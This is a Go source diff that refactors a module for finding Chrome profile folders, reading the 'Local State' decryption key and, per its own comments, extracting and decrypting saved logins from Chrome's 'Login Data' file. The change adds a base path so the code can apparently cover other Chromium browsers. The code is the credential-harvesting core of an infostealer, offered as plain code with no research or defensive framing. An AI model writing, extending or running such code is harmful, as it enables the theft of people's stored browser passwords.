@@ -11,30 +11,37 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"path/filepath"
 	"strings"
 )
 
-const CHROME_PATH_WIN = "\\AppData\\Local\\Google\\Chrome\\User Data\\"
-
 type Chrome struct {
 	name          string
+	basePath      string
 	profilePaths  []string // .../Profile X
 	decryptionKey []byte   // found in "Local State"
 }
 
 func NewChrome() (Chrome, error) {
-	profilePaths, err := getChromeProfiles()
+	name := "chrome"
+	homeDir, _ := os.UserHomeDir()
+	basePath, err := getChromiumBasePath(name)
 	if err != nil {
-		return Chrome{"chrome", nil, nil}, err
+		return Chrome{name, basePath, nil, nil}, err
+	} else {
+		basePath = homeDir + basePath
 	}
 
-	decKey, err := getChromeDecryptionKey()
+	profilePaths, err := getChromeProfiles(basePath)
 	if err != nil {
-		return Chrome{"chrome", nil, nil}, err
+		return Chrome{name, basePath, nil, nil}, err
 	}
 
-	return Chrome{"chrome", profilePaths, decKey}, nil
+	decKey, err := getChromeDecryptionKey(basePath)
+	if err != nil {
+		return Chrome{name, basePath, nil, nil}, err
+	}
+
+	return Chrome{name, basePath, profilePaths, decKey}, nil
 }
 
 // Extract login credentials from Chrome "Login Data" file
@@ -100,12 +107,9 @@ func (c Chrome) DecryptPassword(psw *[]byte) {
 	*psw = plain
 }
 
-func getChromeProfiles() ([]string, error) {
-	homeDir, _ := os.UserHomeDir()
+func getChromeProfiles(basePath string) ([]string, error) {
 	profilePaths := make([]string, 0)
-
-	path := filepath.Dir(fmt.Sprintf("%s%s", homeDir, CHROME_PATH_WIN))
-	content, err := os.ReadDir(path)
+	content, err := os.ReadDir(basePath)
 	if err != nil {
 		return profilePaths, err
 	}
@@ -113,7 +117,7 @@ func getChromeProfiles() ([]string, error) {
 	localStateFound := false
 	for _, entry := range content {
 		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile") {
-			profile := fmt.Sprintf("%s\\%s", path, entry.Name())
+			profile := fmt.Sprintf("%s\\%s", basePath, entry.Name())
 			profilePaths = append(profilePaths, profile)
 		}
 
@@ -130,9 +134,8 @@ func getChromeProfiles() ([]string, error) {
 	}
 }
 
-func getChromeDecryptionKey() ([]byte, error) {
-	homeDir, _ := os.UserHomeDir()
-	stateFile, err := os.ReadFile(fmt.Sprintf("%s\\%s\\%s", homeDir, CHROME_PATH_WIN, "Local State"))
+func getChromeDecryptionKey(basePath string) ([]byte, error) {
+	stateFile, err := os.ReadFile(fmt.Sprintf("%s\\%s", basePath, "Local State"))
 	if err != nil {
 		return nil, err
 	}
